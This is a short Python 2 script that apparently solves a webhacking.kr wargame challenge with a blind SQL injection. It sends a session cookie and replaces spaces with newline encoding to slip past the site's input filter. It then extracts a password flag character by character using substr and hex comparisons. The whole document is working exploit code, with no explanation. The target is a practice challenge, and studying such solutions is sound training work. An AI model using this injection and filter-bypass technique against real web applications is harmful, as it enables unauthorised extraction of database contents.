import urllib2, re, string
 
header = {'Cookie':'PHPSESSID=31c4baaf95b'}
result = str()
subqry = "select min(flag) from prob13password".replace(' ','%0A')
 
for i in range(1, 20):
    for j in string.printable:
        print j
        param = "(substr((" + subqry + ")," + str(i) + ",1)in(" + hex(ord(j)) + "))"        
        req = urllib2.Request('http://webhacking.kr/challenge/web/web-10/?no='+param, headers=header)
        res = urllib2.urlopen(req).read()
        if re.findall("<td>1</td>", res):
            result += j
            break
 
    print result
